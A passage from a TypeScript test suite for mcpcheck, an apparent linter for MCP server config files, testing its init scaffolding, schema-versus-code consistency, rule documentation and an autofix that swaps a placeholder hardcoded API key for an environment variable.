      rules: Record<string, { enabled: boolean; severity: string }>;
    };
    assert.equal(cfg.rules["dangerousCommand"]!.severity, "error");

    const workflow = await readFile(join(dir, ".github/workflows/mcpcheck.yml"), "utf8");
    assert.ok(workflow.includes("MukundaKatta/mcpcheck@v1"), "workflow should reference the action");
    assert.ok(workflow.includes("upload-sarif"), "workflow should upload SARIF");

    // Second run without --force: everything skipped.
    const second = await runInit({ cwd: dir, force: false });
    assert.deepEqual(second.written, []);
    assert.deepEqual(second.skipped.sort(), [
      ".github/workflows/mcpcheck.yml",
      "mcpcheck.config.json",
    ]);

    // --force overwrites.
    const third = await runInit({ cwd: dir, force: true });
    assert.deepEqual(third.skipped, []);
    assert.equal(third.written.length, 2);
  });

  it("--config-only skips the workflow", async () => {
    const { runInit } = await import("../src/init.js");
    const { mkdtemp, access } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "mcpcheck-init-"));
    const result = await runInit({ cwd: dir, force: false, configOnly: true });
    assert.deepEqual(result.written, ["mcpcheck.config.json"]);
    await access(join(dir, "mcpcheck.config.json"));
    await assert.rejects(() => access(join(dir, ".github/workflows/mcpcheck.yml")));
  });
});

describe("init config file parses as our own --config", async () => {
  it("the scaffolded mcpcheck.config.json loads via loadConfigFile", async () => {
    const { runInit } = await import("../src/init.js");
    const { mergeConfig } = await import("../src/config.js");
    const { loadConfigFile } = await import("../src/config-fs.js");
    const { mkdtemp } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "mcpcheck-init-"));
    await runInit({ cwd: dir, force: false, configOnly: true });
    const loaded = loadConfigFile(join(dir, "mcpcheck.config.json"));
    const defaults = mergeConfig();
    // Scaffolded config matches the defaults we merge in code: this is the
    // guarantee that the file can be deleted without behavioural change.
    assert.deepEqual(loaded.rules, defaults.rules);
  });
});

describe("schema/mcp-config.schema.json", () => {
  it("Server properties match KNOWN_SERVER_FIELDS (schema and code can't drift)", async () => {
    const { readFile } = await import("node:fs/promises");
    const { fileURLToPath } = await import("node:url");
    const { dirname, resolve } = await import("node:path");
    const { KNOWN_SERVER_FIELDS } = await import("../src/rules/constants.js");

    const here = dirname(fileURLToPath(import.meta.url));
    const schema = JSON.parse(
      await readFile(resolve(here, "..", "schema", "mcp-config.schema.json"), "utf8")
    ) as { $defs: { Server: { properties: Record<string, unknown> } } };

    const schemaProps = new Set(Object.keys(schema.$defs.Server.properties));
    const codeProps = KNOWN_SERVER_FIELDS;

    for (const p of schemaProps) {
      assert.ok(
        codeProps.has(p),
        `schema lists field "${p}" that KNOWN_SERVER_FIELDS doesn't — drift (check src/rules/constants.ts)`
      );
    }
    for (const p of codeProps) {
      assert.ok(
        schemaProps.has(p),
        `KNOWN_SERVER_FIELDS has "${p}" but schema/mcp-config.schema.json doesn't — drift (hand-edit schema or remove from code)`
      );
    }
  });
});

describe("schema.json", () => {
  it("rule keys match DEFAULT_CONFIG.rules (generator can't drift)", async () => {
    const { readFile } = await import("node:fs/promises");
    const { fileURLToPath } = await import("node:url");
    const { dirname, resolve } = await import("node:path");
    const { DEFAULT_CONFIG } = await import("../src/config.js");

    const here = dirname(fileURLToPath(import.meta.url));
    const schema = JSON.parse(
      await readFile(resolve(here, "..", "schema.json"), "utf8")
    ) as {
      properties: { rules: { properties: Record<string, unknown> } };
      $defs: { RuleConfig: { properties: { severity: { enum: string[] } } } };
    };

    const schemaKeys = Object.keys(schema.properties.rules.properties).sort();
    const configKeys = Object.keys(DEFAULT_CONFIG.rules).sort();
    assert.deepEqual(
      schemaKeys,
      configKeys,
      "schema.json rule properties must exactly match RulesConfig in code. Run `npm run schema:gen`."
    );

    // Sanity: severity enum matches the Severity union.
    assert.deepEqual(
      schema.$defs.RuleConfig.properties.severity.enum.sort(),
      ["error", "info", "off", "warning"]
    );
  });

  it("scaffolded init config validates structurally against the schema", async () => {
    const { runInit } = await import("../src/init.js");
    const { readFile, mkdtemp } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join, dirname, resolve } = await import("node:path");
    const { fileURLToPath } = await import("node:url");

    const dir = await mkdtemp(join(tmpdir(), "mcpcheck-schema-"));
    await runInit({ cwd: dir, force: false, configOnly: true });
    const cfg = JSON.parse(
      await readFile(join(dir, "mcpcheck.config.json"), "utf8")
    ) as { $schema?: string; rules: Record<string, unknown> };

    const here = dirname(fileURLToPath(import.meta.url));
    const schema = JSON.parse(
      await readFile(resolve(here, "..", "schema.json"), "utf8")
    ) as {
      properties: { rules: { properties: Record<string, unknown> } };
    };
    const schemaRuleKeys = new Set(Object.keys(schema.properties.rules.properties));

    assert.equal(
      typeof cfg.$schema,
      "string",
      "scaffolded config should ship with a $schema pointer"
    );
    for (const key of Object.keys(cfg.rules)) {
      assert.ok(
        schemaRuleKeys.has(key),
        `scaffolded rule "${key}" is not in schema.json — schema or scaffolder drifted`
      );
    }
    // Every schema-known rule should be present (no surprise omissions).
    for (const key of schemaRuleKeys) {
      assert.ok(
        key in cfg.rules,
        `schema rule "${key}" is missing from scaffolded mcpcheck.config.json`
      );
    }
  });
});

describe("rule-docs", () => {
  it("exposes an explanation for every built-in rule id", async () => {
    const { RULE_DOCS, explainRule } = await import("../src/rule-docs.js");
    const ids = [
      "invalid-json",
      "missing-transport",
      "conflicting-transport",
      "invalid-command",
      "invalid-args",
      "invalid-env",
      "hardcoded-secret",
      "invalid-url",
      "invalid-transport",
      "unknown-field",
      "relative-path",
      "empty-servers",
      "duplicate-server-name",
      "unstable-reference",
      "dangerous-command",
    ];
    for (const id of ids) {
      assert.ok(
        RULE_DOCS.some((d: { id: string }) => d.id === id),
        `rule "${id}" has no documentation entry`
      );
      assert.ok(explainRule(id), `explainRule(${id}) returned nothing`);
    }
    assert.equal(explainRule("does-not-exist"), undefined);
  });
});

describe("applyFixes", () => {
  it("replaces hardcoded secret with env substitution", () => {
    const src = `{
      "mcpServers": {
        "s": {
          "command": "node",
          "env": { "OPENAI_API_KEY": "sk-proj-hardcoded12345678901234567890abc" }
        }
      }
    }`;
    const report = checkSource(src, "x.json");
    const { output, applied } = applyFixes(src, report.issues);
    assert.equal(applied.length, 1);
    assert.ok(output.includes(`"\${OPENAI_API_KEY}"`));
  });
});
